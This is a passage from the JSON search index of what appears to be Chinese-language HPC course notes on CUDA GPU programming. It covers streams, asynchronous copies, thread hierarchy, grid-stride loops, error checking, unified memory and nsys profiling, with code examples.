\u521b\u5efa\u975e\u9ed8\u8ba4\u6d41\uff0c\u7136\u540e\u4f5c\u4e3a\u7b2c\u56db\u4e2a\u6267\u884c\u914d\u7f6e\u53c2\u6570\u4f20\u7ed9\u6838\u51fd\u6570\u3002\u5728\u4f7f\u7528\u540e\u5229\u7528 cudaStreamDestroy \u9500\u6bc1\u6d41\u3002\u4e00\u4e2a\u4f8b\u5b50\uff1a cudaStream_t stream ; cudaStreamCreate ( & stream ); kernel <<< number_of_blocks , threads_per_block , 0 , stream >>> (); cudaStreamDestroy ( stream ); \u51e0\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff1a cudaStreamCreate \u63a5\u6536 stream \u7684\u6307\u9488 cudaStreamDestroy \u63a5\u6536 stream \u503c\uff08\u4e0d\u662f\u6307\u9488\uff09 \u6267\u884c\u914d\u7f6e\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e0e\u5171\u4eab\u5185\u5b58\uff08Shared Memory\uff09\u6709\u5173\uff0c\u9ed8\u8ba4\u4e3a 0 \u4f7f\u7528\u6d41\u5b9e\u73b0\u6570\u636e\u4f20\u8f93\u548c\u4ee3\u7801\u7684\u91cd\u53e0\u6267\u884c \u00b6 \u5728\u4ee5\u4e0b\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5e76\u975e\u5728\u7b49\u5f85\u6574\u4e2a\u5185\u5b58\u62f7\u8d1d\u5b8c\u6210\u4e4b\u540e\u518d\u5f00\u59cb\u8fd0\u884c\u6838\u51fd\u6570\uff0c\u800c\u662f\u62f7\u8d1d\u5e76\u5904\u7406\u6240\u9700\u7684\u6570\u636e\u6bb5\uff0c\u5e76\u8ba9\u6bcf\u4e2a\u62f7\u8d1d/\u5904\u7406\u4e2d\u7684\u6570\u636e\u6bb5\u5747\u5728\u5404\u81ea\u7684\u975e\u9ed8\u8ba4\u6d41\u4e2d\u8fd0\u884c\u3002\u901a\u8fc7\u4f7f\u7528\u6b64\u6280\u672f\uff0c\u60a8\u53ef\u4ee5\u5f00\u59cb\u5904\u7406\u90e8\u5206\u6570\u636e\uff0c\u540c\u65f6\u4e3a\u540e\u7eed\u6bb5\u5e76\u53d1\u6267\u884c\u5185\u5b58\u4f20\u8f93\u3002\u4f7f\u7528\u6b64\u6280\u672f\u8ba1\u7b97\u64cd\u4f5c\u6b21\u6570\u7684\u6570\u636e\u6bb5\u7279\u5b9a\u503c\u548c\u6570\u7ec4\u5185\u7684\u504f\u79fb\u4f4d\u7f6e\u65f6\u5fc5\u987b\u683c\u5916\u5c0f\u5fc3\uff0c\u5982\u4e0b\u6240\u793a\uff1a int N = 2 << 24 ; int size = N * sizeof ( int ); int * host_array ; int * device_array ; cudaMallocHost ( & host_array , size ); // Pinned host memory allocation. cudaMalloc ( & device_array , size ); // Allocation directly on the active GPU device. initializeData ( host_array , N ); // Assume this application needs to initialize on the host. const int numberOfSegments = 4 ; // This example demonstrates slicing the work into 4 segments. int segmentN = N / numberOfSegments ; // A value for a segment's worth of `N` is needed. size_t segmentSize = size / numberOfSegments ; // A value for a segment's worth of `size` is needed. // For each of the 4 segments... for ( int i = 0 ; i < numberOfSegments ; ++ i ) { // Calculate the index where this particular segment should operate within the larger arrays. segmentOffset = i * segmentN ; // Create a stream for this segment's worth of copy and work. cudaStream_t stream ; cudaStreamCreate ( & stream ); // Asynchronously copy segment's worth of pinned host memory to device over non-default stream. cudaMemcpyAsync ( & device_array [ segmentOffset ], // Take care to access correct location in array. & host_array [ segmentOffset ], // Take care to access correct location in array. segmentSize , // Only copy a segment's worth of memory. cudaMemcpyHostToDevice , stream ); // Provide optional argument for non-default stream. // Execute segment's worth of work over same non-default stream as memory copy. kernel <<< number_of_blocks , threads_per_block , 0 , stream >>> ( & device_array [ segmentOffset ], segmentN ); // `cudaStreamDestroy` will return immediately (is non-blocking), but will not actually destroy stream until // all stream operations are complete. cudaStreamDestroy ( stream ); }","title":"GPU \u7f16\u7a0b"},{"location":"hpc/hpc101/gpu/#gpu","text":"Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516d\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e09\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516d\u6b21\u8bfe PPT NVIDIA Deep Learning Institute\uff1a \u52a0\u901f\u8ba1\u7b97\u57fa\u7840 \u2014\u2014 CUDA C/C++","title":"GPU \u7f16\u7a0b"},{"location":"hpc/hpc101/gpu/#gpu_1","text":"\u63d0\u4f9b\u66f4\u9ad8\u7b97\u529b CPU\uff1a\u6838\u6570\u5c11\u3001\u590d\u6742\uff1bcache \u5f88\u5927\uff1b\u5185\u5b58\u5927\u4f46\u6162\uff1b\u9002\u5408\u4e32\u884c\u6216\u7b80\u5355\u5e76\u884c GPU\uff1a\u6838\u6570\u5f88\u591a\u3001\u7b80\u5355\uff1bcache \u5f88\u5c0f\uff1b\u5185\u5b58\u5c0f\u4f46\u5feb\uff1b\u9002\u5408\u590d\u6742\u5e76\u884c","title":"GPU"},{"location":"hpc/hpc101/gpu/#_1","text":"\u786c\u4ef6\u6267\u884c\u6a21\u578b\uff08Hardware Execution Model\uff09<-> CUDA \u7f16\u7a0b\u6a21\u578b GPU <-> Grid Streaming Multi-processor <-> Thread block CUDA core <-> Thread GPU \u7f16\u7a0b\u6a21\u578b\u662f SPMD\uff08Single Program Multiple Data\uff0c\u5355\u4ee3\u7801\u591a\u6570\u636e\uff09\uff0c\u4e5f\u5c31\u662f MultiThreaded \u4ee5\u4ee5\u4e0b\u4ee3\u7801\u4e3a\u4f8b for ( int i = 0 ; i < N ; ++ i ) { C [ i ] = A [ i ] + B [ i ]; } SISD \uff08\u5355\u6307\u4ee4\u5355\u6570\u636e\uff09\uff1a\u6bcf\u5c42\u5faa\u73af\u662f load load add store\uff0c\u5faa\u73af N \u6b21 SIMD \uff08\u5355\u6307\u4ee4\u591a\u6570\u636e\uff09\uff1a\u5229\u7528 SIMD \u6307\u4ee4\uff0c\u51cf\u5c11\u5faa\u73af\u6b21\u6570\uff0c\u4e00\u6b21\u6307\u4ee4\u6267\u884c\u591a\u6b21\u5faa\u73af\uff0cload \u591a\u4e2a\u6570\u3001add \u591a\u6b21\u3001store \u591a\u6b21 SPMD \uff08\u5355\u4ee3\u7801\u591a\u6570\u636e\uff09\uff1a\u6267\u884c\u65f6\u5206\u4e3a\u591a\u4e2a thread\uff0c\u6bcf\u4e2a thread \u5904\u7406\u4e00\u6b21\u5faa\u73af\u7684\u6570\u636e","title":"\u7f16\u7a0b\u6a21\u578b\u4e0e\u786c\u4ef6\u6267\u884c\u6a21\u578b"},{"location":"hpc/hpc101/gpu/#cuda","text":"nvidia-smi \u547d\u4ee4\u67e5\u770b GPU \u4fe1\u606f CUDA C/C++ \u6587\u4ef6\u6269\u5c55\u540d\u4e3a .cu\uff0c\u4f7f\u7528 nvcc \u7f16\u8bd1\u3002\u4e00\u4e2a CUDA \u4ee3\u7801\u7684\u4f8b\u5b50\uff1a void CPUFunction () { printf ( \"This function is defined to run on the CPU. \\n \" ); } __global__ void GPUFunction () { printf ( \"This function is defined to run on the GPU. \\n \" ); } int main () { CPUFunction (); GPUFunction <<< 1 , 1 >>> (); cudaDeviceSynchronize (); } \u5176\u4e2d\u4e00\u4e9b CUDA \u7279\u6709\u5185\u5bb9\u7684\u89e3\u91ca\uff1a __global__ void GPUFunction() __global__ \u5173\u952e\u5b57\u8868\u660e\u4ee5\u4e0b\u51fd\u6570\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u5e76\u53ef\u5168\u5c40\u8c03\u7528\uff0c\u800c\u5728\u6b64\u79cd\u60c5\u51b5\u4e0b\uff0c\u5219\u6307\u7531 CPU \u6216 GPU \u8c03\u7528 \u901a\u5e38\uff0c\u6211\u4eec\u5c06\u5728 CPU \u4e0a\u6267\u884c\u7684\u4ee3\u7801\u79f0\u4e3a\u4e3b\u673a\u4ee3\u7801\uff0c\u800c\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u4ee3\u7801\u79f0\u4e3a\u8bbe\u5907\u4ee3\u7801 \u4f7f\u7528 __global__ \u5173\u952e\u5b57\u5b9a\u4e49\u7684\u51fd\u6570\u9700\u8981\u8fd4\u56de void \u7c7b\u578b GPUFunction<<<1, 1>>>() \u901a\u5e38\uff0c\u5f53\u8c03\u7528\u8981\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u51fd\u6570\u65f6\uff0c\u6211\u4eec\u5c06\u6b64\u79cd\u51fd\u6570\u79f0\u4e3a\u5df2\u542f\u52a8\u7684\u6838\u51fd\u6570 <<< ... >>> \u8bed\u6cd5\u63d0\u4f9b\u6267\u884c\u914d\u7f6e\uff0c\u5373\u7ebf\u7a0b\u5757\u7684\u6570\u91cf\u548c\u6bcf\u4e2a\u7ebf\u7a0b\u5757\u5185\u7684\u7ebf\u7a0b\u6570 cudaDeviceSynchronize() \u6838\u51fd\u6570\u542f\u52a8\u65b9\u5f0f\u4e3a\u5f02\u6b65\uff1aCPU \u4ee3\u7801\u5c06\u7ee7\u7eed\u6267\u884c\u800c\u65e0\u9700\u7b49\u5f85\u6838\u51fd\u6570\u5b8c\u6210\u542f\u52a8\u3002 \u8c03\u7528 CUDA \u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u51fd\u6570 cudaDeviceSynchronize \u53ef\u4ee5\u4f7f\u4e3b\u673a\uff08CPU\uff09\u4ee3\u7801\u6682\u4f5c\u7b49\u5f85\uff0c\u76f4\u81f3\u8bbe\u5907\uff08GPU\uff09\u4ee3\u7801\u6267\u884c\u5b8c\u6210\uff0c\u7136\u540e\u518d\u6062\u590d\u4e3b\u673a\u4ee3\u7801\u7684\u6267\u884c \u6574\u4e2a\u8c03\u7528 GPU \u7684\u5927\u81f4\u6d41\u7a0b\u4e3a\uff1a \u5148\u5728 CPU \u4e2d\u8fdb\u884c\u6b63\u5e38 main \u51fd\u6570\u4e2d\u7684\u5de5\u4f5c\uff08\u5373\u56fe\u4e2d initialize\uff09 \u7136\u540e CPU \u8c03\u7528 GPU \u6838\u51fd\u6570 performWork()\uff0c\u540c\u65f6 CPU \u4e2d\u7ee7\u7eed\u8fdb\u884c\u5b83\u8be5\u505a\u7684\u5176\u5b83\u5de5\u4f5c\uff08\u5373\u56fe\u4e2d cpuWork\uff09 CPU \u6267\u884c\u5b8c cpuWork() \u540e\u7ecf\u8fc7 cudaDeviceSynchronize() \u4e0e GPU \u540c\u6b65\uff0c\u963b\u585e\u5f53\u524d CPU \u4efb\u52a1\uff0c\u7b49\u5f85 GPU \u7684 performWork \u6267\u884c\u5b8c \u540c\u6b65\u540e CPU \u7ee7\u7eed\u6267\u884c\u5269\u4e0b\u7684 verifyWork()","title":"CUDA"},{"location":"hpc/hpc101/gpu/#_2","text":"\u4f7f\u7528 nvcc \u8fdb\u884c\u7f16\u8bd1\uff0c\u4f8b\u5982\uff1a $ nvcc -arch = sm_70 -o out code.cu -run - \u4f7f\u7528 sm_70 \u67b6\u6784 - \u7f16\u8bd1 code.cu \u6587\u4ef6 - \u8f93\u51fa\u4e3a out \u53ef\u6267\u884c\u6587\u4ef6 - -run \u6807\u5fd7\u6807\u8bc6\u7f16\u8bd1\u5b8c\u7acb\u5373\u6267\u884c \u53e6\u5916\uff0c\u53ef\u4ee5\u4f7f\u7528 -std=c++11 \u6765\u6307\u5b9a C/C++ \u8bed\u8a00\u7248\u672c","title":"\u7f16\u8bd1"},{"location":"hpc/hpc101/gpu/#_3","text":"\u6b63\u5982\u524d\u9762 1.1 \u63d0\u5230\uff0cCUDA \u7684\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u4ece\u5927\u5230\u5c0f\u4e3a Grid -> Thread Block -> Thread \u7ed3\u6784\u793a\u610f\u56fe\uff1a \u6bcf\u4e2a\u7ebf\u7a0b\uff08Thread\uff09\u4e2d\u90fd\u8fd0\u884c\u4e00\u4efd\u6838\u51fd\u6570\u4e2d\u5185\u5bb9\uff0c\u591a\u4e2a\u7ebf\u7a0b\u7ec4\u6210\u4e00\u4e2a\u7ebf\u7a0b\u5757\uff08Thread Block\uff09\uff0c\u4e0e\u6838\u51fd\u6570\u542f\u52a8\u5173\u8054\u7684\u6240\u6709\u5757\u7ec4\u6210\u7f51\u683c\uff08Grid\uff09 \u542f\u52a8\u6838\u51fd\u6570\u65f6\u8fdb\u884c\u7684\u914d\u7f6e\u5c31\u662f <<< \u7ebf\u7a0b\u5757\u6570 , \u6bcf\u4e2a\u5757\u4e2d\u7ebf\u7a0b\u6570 >>>\uff0c\u5176\u4e2d\u6bcf\u5757\u4e2d\u7ebf\u7a0b\u6570\u4e00\u822c\u6700\u5927\u4e3a 1024","title":"\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784"},{"location":"hpc/hpc101/gpu/#_4","text":"\u5728\u6838\u51fd\u6570\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee CUDA \u63d0\u4f9b\u7684\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf\uff0c\u5e38\u7528\u7684\u6709\uff1a gridDim.x \uff1aGrid \u4e2d\u7684 Block \u6570 blockIdx.x \uff1a\u5f53\u524d Block \u5728 Grid \u4e2d\u7684\u7d22\u5f15 blockDim.x \uff1a\u6bcf\u4e2a Block \u4e2d\u7684 Thread \u6570 threadIdx.x \uff1a\u5f53\u524d Thread \u5728\u6240\u5728\u7684 Block \u4e2d\u7684\u7d22\u5f15","title":"\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf"},{"location":"hpc/hpc101/gpu/#_5","text":"\u4f8b\u5982\u5e76\u884c\u52a0\u901f for \u5faa\u73af\uff0c\u4e3a\u4e86\u4f7f\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d\u6838\u51fd\u6570\u5747\u5904\u7406\u4e0d\u540c\u7684 i\uff0c\u8bbf\u95ee\u5185\u5b58 arr[i]\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u53d8\u91cf\u8fdb\u884c\u8ba1\u7b97\uff1a i = threadIdx . x + blockIdx . x * blockDim . x \u5373\u6bcf\u4e2a\u7ebf\u7a0b\u5904\u7406\u7684 i \u4e3a\uff1a \u4f46\u8fd9\u662f\u7406\u60f3\u60c5\u51b5\uff0c\u6709\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\u9700\u8981\u5904\u7406\uff1a \u603b\u7ebf\u7a0b\u6570\u591a\u4e8e\u8981\u5904\u7406\u7684\u6570\u636e\u6570\uff08\u6216\u8005\u8bf4\u5faa\u73af\u6b21\u6570\uff09\uff0c\u5219\u8fd9\u6837\u505a\u4f1a\u8bbf\u95ee\u5230\u975e\u6cd5\u5185\u5b58 \u603b\u7ebf\u7a0b\u6570\u5c11\u4e8e\u8981\u5904\u7406\u7684\u6570\u636e\u6570\uff0c\u5219\u8fd9\u6837\u505a\u4f1a\u5b58\u5728\u6ca1\u6709\u6267\u884c\u7684\u5faa\u73af \u5bf9\u4e8e\u7b2c\u4e00\u79cd\uff0c\u53ea\u9700\u8981\u5728\u8ba1\u7b97\u5f97\u5230 i \u4e4b\u540e\u4e0e\u603b\u6570 n \u6bd4\u8f83\uff0c\u5982\u679c i < n \u5219\u6267\u884c\uff0c\u5426\u5219\u5728\u8fd9\u4e2a\u7ebf\u7a0b\u5185\u4ec0\u4e48\u90fd\u4e0d\u505a \u5bf9\u4e8e\u7b2c\u4e8c\u79cd\uff0c\u5219\u9700\u8981\u6bcf\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e0d\u6b62\u4e00\u4e2a\u5faa\u73af\u7684\u5de5\u4f5c\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528 \u7f51\u683c\u8de8\u5ea6\u5faa\u73af \uff1a \u800c\u6bcf\u4e2a\u7ebf\u7a0b\u8fdb\u884c\u5faa\u73af\u7684\u8de8\u5ea6\u6070\u597d\u4e3a Grid \u4e2d\u7684\u603b\u7ebf\u7a0b\u6570\uff0c\u56e0\u4e3a gridDim.x \u8868\u793a Grid \u4e2d Block \u6570\uff0cblockDim.x \u8868\u793a\u6bcf\u4e2a Block \u4e2d Thread \u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8de8\u5ea6\u6070\u597d\u662f gridDim . x * blockDim . x \u56e0\u6b64 for \u5faa\u73af\u901a\u8fc7\u6838\u51fd\u6570\u5728 GPU \u4e2d\u5e76\u884c\u8fd0\u884c\u7684\u5e38\u7528\u5199\u6cd5\u662f\uff1a __global__ void kernel ( int * a , int N ) { int idx = threadIdx . x + blockIdx . x * blockDim . x ; int stride = gridDim . x * blockDim . x ; for ( int i = idx ; i < N ; i += stride ) { // a[i] ... } }","title":"\u534f\u8c03\u5e76\u884c\u7ebf\u7a0b"},{"location":"hpc/hpc101/gpu/#_6","text":"\u7f51\u683c\u548c\u7ebf\u7a0b\u5757\u6700\u591a\u53ef\u4ee5\u6709\u4e09\u4e2a\u7ef4\u5ea6\uff0c\u4f7f\u7528\u591a\u7ef4\u5ea6\u5b9a\u4e49\u7f51\u683c\u548c\u5757\u4e0d\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u5904\u7406\u591a\u7ef4\u6570\u636e\u65f6\u4f1a\u66f4\u65b9\u4fbf \u5b9a\u4e49\u4e8c\u7ef4\u6216\u4e09\u7ef4\u7684\u7f51\u683c\u548c\u5757\u53ef\u4ee5\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684 dim3 \u7c7b\u578b\uff1a dim3 threadsPerBlock ( 16 , 16 , 1 ); dim3 numberOfBlocks ( 16 , 16 , 1 ); kernel <<< numberOfBlocks , threadsPerBlock >>> (...); \u5728\u6838\u51fd\u6570\u4e2d\uff0c gridDim . x gridDim . y blockDim . x blockDim . y \u5747\u4e3a 16 \u4e8c/\u4e09\u7ef4\u5faa\u73af\u7684\u5e76\u884c\u5904\u7406\u4e5f\u7c7b\u4f3c\u4e0a\u9762\u4e00\u7ef4\u60c5\u51b5\uff1a __global__ void kernel ( int ** a , int N1 , int N2 ) { int idxx = threadIdx . x + blockIdx . x * blockDim . x ; int stridex = gridDim . x * blockDim . x ; int idxy = threadIdx . y + blockIdx . y * blockDim . y ; int stridey = gridDim . y * blockDim . y ; for ( int i = idxx ; i < N1 ; i += stridex ) { for ( int j = idxy ; j < N2 ; j += stridey ) { // a[i][j] ... } } }","title":"\u4e8c\u7ef4\u548c\u4e09\u7ef4\u7684\u7f51\u683c\u548c\u5757"},{"location":"hpc/hpc101/gpu/#_7","text":"\u8bb8\u591a CUDA \u51fd\u6570\u4f1a\u8fd4\u56de\u7c7b\u578b\u4e3a cudaError_t \u7684\u503c\uff0c\u6765\u7528\u4e8e\u540e\u7eed\u68c0\u67e5\u8c03\u7528\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u6ca1\u6709\u9519\u8bef\u7684\u503c\u4e3a cudaSuccess \uff0c\u5982\u679c\u6709\u9519\u8bef\uff0c\u53ef\u4ee5\u901a\u8fc7 cudaGetErrorString \u6765\u83b7\u53d6\u9519\u8bef\u7684\u5177\u4f53\u5185\u5bb9\u3002\u4ee5 cudaMallocManaged \u4e3a\u4f8b\uff1a cudaError_t err ; err = cudaMallocManaged ( & a , N ); if ( err != cudaSuccess ) { printf ( \"Error: %s \\n \" , cudaGetErrorString ( err )); } \u4f46\u6838\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u56e0\u6b64\u68c0\u67e5\u542f\u52a8\u6838\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u9519\u8bef\uff08\u4f8b\u5982\u542f\u52a8\u914d\u7f6e\u9519\u8bef\uff09\u9700\u8981\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684 cudaGetLastError \u51fd\u6570\uff1a kernel <<< 1 , -1 >>> (); cudaError_t err ; err = cudaGetLastError ; if ( err != cudaSuccess ) { printf ( \"Error: %s \\n \" , cudaGetErrorString ( err )); } \u800c\u4e3a\u4e86\u6355\u83b7\u5f02\u6b65\u9519\u8bef\uff08\u5982\u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\u51fa\u73b0\u7684\u9519\u8bef\uff09\uff0c\u5219\u9700\u8981\u68c0\u67e5 cudaDeviceSynchronize \u7684\u8fd4\u56de\u503c\uff0c\u4e00\u4e2a\u5b9e\u7528\u5199\u6cd5\u662f\uff1a #include <assert.h> inline cudaError_t checkCuda ( cudaError_t result ) { if ( result != cudaSuccess ) { fprintf ( stderr , \"CUDA Runtime Error: %s \\n \" , cudaGetErrorString ( result )); assert ( result == cudaSuccess ); } return result ; } int main () { ... kernel <<< ..., ... >>> (...); checkCuda ( cudaGetLastError ()); checkCuda ( cudaDeviceSynchronize ()); ... }","title":"\u9519\u8bef\u5904\u7406"},{"location":"hpc/hpc101/gpu/#_8","text":"C \u5206\u914d\u5185\u5b58\u4f7f\u7528\u7684\u662f malloc \u51fd\u6570\uff0c\u4f46\u901a\u8fc7 malloc \u5f97\u5230\u7684\u5185\u5b58\u53ea\u80fd\u5728 CPU \u4e2d\u8bbf\u95ee \u9700\u8981\u5728 CPU \u548c GPU \u4e2d\u540c\u65f6\u8bbf\u95ee\u67d0\u5185\u5b58\uff0c\u9700\u8981\u901a\u8fc7 cudaMallocManaged \u51fd\u6570\u6765\u5206\u914d\uff0c\u5373\uff1a int * a ; size_t size = n * sizeof ( int ); a = ( int * ) malloc ( size ) -> cudaMallocManaged ( & a , size ) \u7136\u540e\u91ca\u653e\u5185\u5b58\u65f6\u4f7f\u7528 cudaFree \u4ee3\u66ff free\uff0c\u5373 cudaFree(a) \u6ce8\u610f\uff1a\u5229\u7528 cudaMallocManaged \u5206\u914d\u7684\u5185\u5b58\u53ef\u4ee5\u5728 CPU \u548c GPU \u4e2d\u4f7f\u7528\uff08\u540e\u9762\u4f1a\u8bf4\uff09\uff0c\u5229\u7528 cudaMalloc \u5206\u914d\u7684\u5185\u5b58\u53ea\u53ef\u4ee5\u5728 GPU \u4e2d\u4f7f\u7528","title":"\u5206\u914d\u5185\u5b58"},{"location":"hpc/hpc101/gpu/#nsys","text":"nsys\uff08Nsight System\uff09\u662f CUDA \u5de5\u5177\u5305\u9644\u5e26\u7684\u6027\u80fd\u5206\u6790\u5668\uff0c\u53ef\u4ee5\u6267\u884c\u7a0b\u5e8f\u5e76\u751f\u6210\u5305\u542b GPU \u6d3b\u52a8\u3001CUDA API \u8c03\u7528\u3001\u5185\u5b58\u6d3b\u52a8\u7b49\u4fe1\u606f\u7684\u62a5\u544a\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 GUI \u67e5\u770b\u65f6\u95f4\u8f74 nsys \u4f7f\u7528\u53ea\u9700\u8981\u6307\u5b9a nvcc \u7f16\u8bd1\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5373\u53ef\uff1a $ nsys profile --stats = true ./out - \u4f7f\u7528 nsys profile \u8fdb\u884c\u5206\u6790 - --stats=true \u8868\u793a\u5411\u547d\u4ee4\u884c\u4e2d\u6253\u5370\u6458\u8981\u4fe1\u606f - \u5206\u6790 out \u7a0b\u5e8f \u4e5f\u53ef\u4ee5\u4f7f\u7528 -o \u6307\u5b9a\u62a5\u544a\u8f93\u51fa\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528 Nsight System GUI \u8f6f\u4ef6\u6253\u5f00\u8fdb\u884c\u5206\u6790 nsys \u9ed8\u8ba4\u4e0d\u4f1a\u8986\u76d6\u539f\u6709\u62a5\u544a\uff0c\u9700\u8981\u8986\u76d6\u8981\u4f7f\u7528 CLI flag --force-overwrite=true","title":"nsys \u6027\u80fd\u5206\u6790"},{"location":"hpc/hpc101/gpu/#_9","text":"\u6d41\u591a\u5904\u7406\u5668\uff08SM\uff0cStreaming Multiprocessor\uff09\u662f\u8fd0\u884c CUDA \u7684 GPU \u4e0a\u7684\u5904\u7406\u5355\u5143 \u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\uff0c\u7ebf\u7a0b\u5757\u4f1a\u63d0\u4f9b\u7ed9 SM \u8fdb\u884c\u6267\u884c\uff0c\u56e0\u6b64\u4e3a\u4e86\u652f\u6301 GPU \u6267\u884c\u5c3d\u53ef\u80fd\u591a\u7684\u5e76\u884c\u64cd\u4f5c\uff0c\u63d0\u9ad8 SM \u7684\u5229\u7528\u7387\u8fdb\u800c\u63d0\u9ad8\u6027\u80fd\uff0c\u4e00\u822c\u5c06\u7ebf\u7a0b\u5757\u6570\uff08\u4e5f\u5c31\u662f\u7f51\u683c\u7ef4\u5ea6\uff09\u6307\u5b9a\u4e3a SM \u6570\u91cf\u7684\u500d\u6570 \u6b64\u5916\uff0cSM \u4f1a\u5728\u540d\u4e3a Warp \u7684\u7ebf\u7a0b\u5757\u5185\u521b\u5efa\u3001\u7ba1\u7406\u3001\u8c03\u5ea6\u3001\u6267\u884c\u5305\u542b 32 \u4e2a\u7ebf\u7a0b\u7684\u7ebf\u7a0b\u7ec4\uff0c\u56e0\u6b64\u4e00\u822c\u4e5f\u5c06\u7ebf\u7a0b\u6570\u91cf\u6307\u5b9a\u4e3a 32 \u7684\u500d\u6570","title":"\u6d41\u591a\u5904\u7406\u5668"},{"location":"hpc/hpc101/gpu/#gpu_2","text":"CUDA \u63d0\u4f9b\u4e86\u83b7\u53d6\u5f53\u524d\u5904\u4e8e\u6d3b\u8dc3\u72b6\u6001\u7684 GPU \u8bbe\u5907\u5c5e\u6027\u7684 API\uff1a int deviceId ; cudaGetDevice ( & deviceId ); cudaDeviceProp props ; cudaGetDeviceProperties ( & props , deviceId ); \u5176\u4e2d cudaGetDevice \u83b7\u53d6\u8bbe\u5907 id\uff0c cudaDeviceProp \u4e3a\u5c5e\u6027\u7684\u7ed3\u6784\u7c7b\u578b\uff0c cudaGetDeviceProperties \u6839\u636e\u8bbe\u5907 id \u83b7\u53d6\u5177\u4f53\u5c5e\u6027 \u6240\u6709\u5c5e\u6027\u89c1\uff1a NVIDIA CUDA \u8fd0\u884c\u65f6\u6587\u6863 \u7ed3\u5408\u4e0a\u9762\uff0c\u4e00\u822c\u8bbe\u7f6e\u5757\u6570\u548c\u7ebf\u7a0b\u6570\u4f7f\u7528\uff1a int deviceId ; int numberOfSMs ; cudaGetDevice ( & deviceId ); cudaDeviceGetAttribute ( & numberOfSMs , cudaDevAttrMultiProcessorCount , deviceId ); size_t threadsPerBlock = 256 ; size_t numberOfBlocks = 32 * numberOfSMs ;","title":"\u67e5\u8be2 GPU \u8bbe\u5907\u5c5e\u6027"},{"location":"hpc/hpc101/gpu/#_10","text":"\u4f7f\u7528 cudaMallocManaged \u5206\u914d\u7684\u5185\u5b58\u4e3a\u7edf\u4e00\u5185\u5b58\uff08UM\uff0cUnified Memory\uff09 \u7edf\u4e00\u5185\u5b58\u5728 CPU \u548c GPU \u5206\u522b\u8bbf\u95ee\u65f6\u7684\u884c\u4e3a\u5982\u4e0b\uff1a \u521a\u5f00\u59cb\u65f6\u5206\u914d\u7684\u5185\u5b58\u4e0d\u5728 CPU \u4e0a\u4e5f\u4e0d\u5728 GPU \u4e0a \u54ea\u4e00\u65b9\u5148\u8bbf\u95ee\uff0c\u4f1a\u9020\u6210\u4e00\u4e2a\u9875\u9519\u8bef\uff08page fault\uff09\uff0c\u7136\u540e\u5c06\u9700\u8981\u7684\u5185\u5b58\u8fc1\u79fb\u5230\u81ea\u5df1\u8eab\u4e0a \u53e6\u4e00\u65b9\u8bbf\u95ee\u65f6\u4e5f\u4f1a\u9020\u6210\u9875\u9519\u8bef\uff0c\u7136\u540e\u518d\u5c06\u9700\u8981\u7684\u5185\u5b58\u8fc1\u79fb\u5230\u81ea\u5df1\u8eab\u4e0a \u6570\u636e\u4ece\u4e3b\u673a\u5230\u8bbe\u5907\u7684\u8fc1\u79fb\u8bb0\u4e3a HtoD\uff0c\u4ece\u8bbe\u5907\u5230\u4e3b\u673a\u7684\u8fc1\u79fb\u8bb0\u4e3a DtoH\uff0c\u901a\u8fc7 nsys \u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u8f6c\u79fb\u64cd\u4f5c \u5728\u7a00\u758f\u8bbf\u95ee\u6a21\u5f0f\u60c5\u51b5\u4e0b\uff0c\u8fd9\u6837\u53ef\u4ee5\u6309\u9700\u8fc1\u79fb\u5185\u5b58\uff0c\u5c24\u5176\u662f\u5728\u591a\u4e2a GPU \u52a0\u901f\u7cfb\u7edf\u4e2d\uff0c\u8fd9\u6837\u7684\u6309\u9700\u8fc1\u79fb\u4f1a\u6709\u663e\u8457\u4f18\u52bf \u6709\u65f6\u53ef\u4ee5\u5c06\u5185\u5b58\u521d\u59cb\u5316\u653e\u5728 GPU \u4e2d\u8fdb\u884c\uff0c\u8fd9\u6837 UM \u4f1a\u5148\u8fc1\u79fb\u5230 GPU \u4e2d\uff0c\u7136\u540e\u9a7b\u7559\u5728 GPU 